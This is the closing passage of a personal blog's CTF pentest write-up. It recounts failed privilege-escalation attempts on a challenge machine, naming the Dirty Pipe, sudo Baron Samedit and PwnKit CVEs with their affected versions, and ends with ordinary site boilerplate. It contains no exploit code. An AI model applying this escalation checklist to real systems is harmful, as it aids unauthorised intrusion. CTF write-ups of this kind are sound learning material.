<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>BTW, we have tried some other methods to elevate privilege but all failed.</p>
<p>For example, we found that the kernel version was 5.4.144+, which can not be exploited by the newest <a target="_blank" rel="noopener" href="https://dirtypipe.cm4all.com/">CVE-2022-0847</a> (a.k.a. Dirty Pipe, &gt;=5.8, &lt;5.16.11, 5.15.25 and 5.10.102). </p>
<p>The <code>sudo</code> version was 1.8.31 but it had been fixed. Someone else pulled the exploit of <a target="_blank" rel="noopener" href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">CVE-2021-3156</a> but it couldnâ€™t be exploited.</p>
<p><img src="/2022/03/13/Pentest_2022_1337UPLIVECTF/image-20220315030742050.png" alt="sudo"></p>
<p>The <code>pkexec</code> command existed but the <a target="_blank" rel="noopener" href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034">CVE-2021-4034</a> (a.k.a. PwnKit) didnâ€™t affect it. </p>
<p>Maybe the author had fixed other known ways of pwning the machine, 23333.</p>
<p>BTW, it was a k8s machine.</p>
<p><img src="/2022/03/13/Pentest_2022_1337UPLIVECTF/image-20220315033804908.png"></p>
<hr>
<p>So we finished all the challenges of the Lovely Kitten Pictures, but to some extent it was so easy for other players and I was so rubbish, 555.</p>
<p><img src="/2022/03/13/Pentest_2022_1337UPLIVECTF/image-20220313181544982.png"></p>
<p>Many thanks for my teammate @nemo who solved the challenges with me.</p>
<p>å–µå–µå¥½èœå•Šï¼Œå‘œå‘œï¼ˆ</p>
<p>å½“ç„¶æ„Ÿè°¢ç†Šç†Š nemo ä¸€èµ·æ¥çœ‹é¢˜ï¼Œè´´è´´ï¼hhh</p>
<br>

<p><small><em><del>å†™å˜¤è¯­å¥½ç´¯ï¼Œä¸ºå•¥æƒ³ä¸å¼€ç”¨è‹±è¯­å†™å•Š</del></em></small></p>
<p><em>ï¼ˆæºœäº†æºœäº†å–µ~</em></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        æ–‡ç« ä½œè€…:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://miaotony.xyz" rel="external nofollow noreferrer">MiaoTony</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        æ–‡ç« é“¾æ¥:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://miaotony.xyz/2022/03/13/Pentest_2022_1337UPLIVECTF/">https://miaotony.xyz/2022/03/13/Pentest_2022_1337UPLIVECTF/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        ç‰ˆæƒå£°æ˜:
                    </i>
                </span>
                <span class="reprint-info">
                    æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨
                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a>
                    è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº
                    <a href="https://miaotony.xyz" target="_blank">MiaoTony</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>å¤åˆ¶æˆåŠŸï¼Œè¯·éµå¾ªæœ¬æ–‡çš„è½¬è½½è§„åˆ™</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">æŸ¥çœ‹</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/CTF/">
                                    <span class="chip bg-color">CTF</span>
                                </a>
                            
                                <a href="/tags/WriteUp/">
                                    <span class="chip bg-color">WriteUp</span>
                                </a>
                            
                                <a href="/tags/Pentest/">
                                    <span class="chip bg-color">Pentest</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="qq,qzone,wechat,weibo,twitter,facebook,google,douban,linkedin" data-wechat-qrcode-helper="<p>å¾®ä¿¡æ‰«ä¸€æ‰«å³å¯åˆ†äº«ï¼</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">èµ</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">æ‰“èµä¸€ä¸‹è®©æˆ‘æ¥ç‚¹å¥½åƒå¥½ç©çš„å‘—~</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <!-- 
                            <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">æ”¯ä»˜å®</a></li> 
                        -->
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">å¾® ä¿¡</a></li>
                    </ul>
                    <!-- 
                        <div id="alipay">
                        <img src="/" class="reward-img" alt="æ”¯ä»˜å®æ‰“èµäºŒç»´ç ">
                        </div> 
                -->
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="å¾®ä¿¡æ‰“èµäºŒç»´ç ">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    
        <link rel="stylesheet" href="/libs/gitalk/gitalk.min.css">
<link rel="stylesheet" href="/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>è¯„è®º</span>
    </div>
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: '116343b4650fce4789b6',
        clientSecret: '3e9be2ad6c9b693af1753290c7c059b1e4f34d5d',
        repo: 'miaotony.github.io',
        owner: 'miaotony',
        admin: "miaotony",
        id: '2022-03-13T17-30-00',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;ä¸Šä¸€ç¯‡</div>
            <div class="card">
                <a href="/2022/03/20/EE_LicheeRV_1_getting_started/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="EE | Sipeed è”ææ´¾ LicheeRV | 1 å¼€ç®±åŠä¸Šæ‰‹å…¥é—¨">
                        
                        <span class="card-title">EE | Sipeed è”ææ´¾ LicheeRV | 1 å¼€ç®±åŠä¸Šæ‰‹å…¥é—¨</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            æœ‰æ–°ç©å…·äº†ï¼æœ€è¿‘æ•´äº†ä¸ªSipeed è”ææ´¾ LicheeRV Dock å…¨å¿—D1å¼€å‘æ¿ï¼Œè¿™ç¯‡åšå®¢å°±æ¥è®°å½•ä¸€ä¸‹å¼€ç®±å’Œä¸Šæ‰‹çš„ä¸€äº›æŠ˜è…¾è¿‡ç¨‹ã€‚
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-20
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Tech/" class="post-category">
                                    Tech
                                </a>
                            
                            <a href="/categories/Tech/EE/" class="post-category">
                                    EE
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Tech/">
                        <span class="chip bg-color">Tech</span>
                    </a>
                    
                    <a href="/tags/EE/">
                        <span class="chip bg-color">EE</span>
                    </a>
                    
                    <a href="/tags/Sipeed/">
                        <span class="chip bg-color">Sipeed</span>
                    </a>
                    
                    <a href="/tags/LicheeRV/">
                        <span class="chip bg-color">LicheeRV</span>
                    </a>
                    
                    <a href="/tags/Configuration/">
                        <span class="chip bg-color">Configuration</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                ä¸‹ä¸€ç¯‡&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/02/07/CTF_2022HgameWeek2/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="CTF | 2022 Hgame Week2 WriteUp">
                        
                        <span class="card-title">CTF | 2022 Hgame Week2 WriteUp</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            å–µå‘œï¼Œéšä¾¿æ¥è®°å½•ä¸€ä¸‹Hgame Week2çš„ä¸€ç‚¹ç‚¹WriteUpã€‚
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-07
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF/">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                    <a href="/tags/WriteUp/">
                        <span class="chip bg-color">WriteUp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('200')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + 'æ¥æº: MiaoTony&#39;så°çª<br />'
            + 'æ–‡ç« ä½œè€…: MiaoTony<br />'
            + 'æ–‡ç« é“¾æ¥: <a href="' + url + '">' + url + '</a><br />'
            + 'æœ¬æ–‡ç« è‘—ä½œæƒå½’ä½œè€…MiaoTonyæ‰€æœ‰ï¼Œä»»ä½•å½¢å¼çš„è½¬è½½éƒ½è¯·æ³¨æ˜å‡ºå¤„ã€‚';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- ä»£ç å—åŠŸèƒ½ä¾èµ– -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- ä»£ç è¯­è¨€ -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- ä»£ç å—å¤åˆ¶ -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- ä»£ç å—æ”¶ç¼© -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;ç›®å½•</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC æ‚¬æµ®æŒ‰é’®. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('1'),
            headingSelector: 'h2, h3, h4, h5'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4, h5').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* ä¿®å¤æ–‡ç« å¡ç‰‡ div çš„å®½åº¦. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // åˆ‡æ¢TOCç›®å½•å±•å¼€æ”¶ç¼©çš„ç›¸å…³æ“ä½œ.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
        <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2022</span>
            
            <a href="/about" target="_blank">MiaoTony</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
                        &nbsp;<i class="fas fa-chart-area"></i>&nbsp;ç«™ç‚¹æ€»å­—æ•°:&nbsp;<span
                class="white-color">358.2k</span>&nbsp;å­—
                                                                                    <span id="busuanzi_container_site_pv">
			|&nbsp;<i class="far fa-eye"></i>&nbsp;æ€»è®¿é—®é‡:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;æ¬¡
            </span>
                                    <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;æ€»è®¿é—®äººæ•°:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;äºº
            </span>
                        <br>
                        <span id="sitetime">è½½å…¥è¿è¡Œæ—¶é—´...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2019";
                    var startMonth = "11";
                    var startDate = "28";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "æœ¬ç«™å·²å®‰å…¨è¿è¡Œ " + diffDays + " å¤© " + diffHours +
                            " å°æ—¶ " + diffMinutes + " åˆ†é’Ÿ " + diffSeconds + " ç§’";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "æœ¬ç«™å·²å®‰å…¨è¿è¡Œ " + diffYears + " å¹´ " + diffDays +
                            " å¤© " + diffHours + " å°æ—¶ " + diffMinutes + " åˆ†é’Ÿ " + diffSeconds + " ç§’";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
                        <br>
                    </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://t.me/MiaoTonyChannel" class="tooltipped" target="_blank" data-tooltip="å…³æ³¨æˆ‘çš„TelegramChannel: @MiaoTonyChannel" data-position="top" data-delay="50">
        <i class="fab fa-telegram"></i>
    </a>



    <a href="https://github.com/miaotony" class="tooltipped" target="_blank" data-tooltip="è®¿é—®æˆ‘çš„GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:miaotony@outlook.com" class="tooltipped" target="_blank" data-tooltip="é‚®ä»¶è”ç³»æˆ‘" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>













    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS è®¢é˜…" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- æœç´¢é®ç½©æ¡† -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;æœç´¢</span>
            <input type="search" id="searchInput" name="s" placeholder="è¯·è¾“å…¥æœç´¢çš„å…³é”®å­—"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    var cnt = 1;
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var content_index = [];
                        var data_title_origin = data.title.trim();
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + String(cnt) + ". " + data_title_origin + "</a>";
                            cnt += 1;
    
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 300 characters
                                var start = first_occur - 30;
                                if (start < 0) {
                                    start = 0;
                                }
                                var match_content = content.substr(start, 300);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });
    
                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    str = "<p class=\"search-result-summary\">å…±æ‰¾åˆ° " + String(cnt-1) + " æ¡ç»“æœ</p>"  + str;
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- å›åˆ°é¡¶éƒ¨æŒ‰é’® -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.min.js"></script>

    

    
<script>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?40e312a1eec109cf96e30988cf3bfe70";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

    
    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
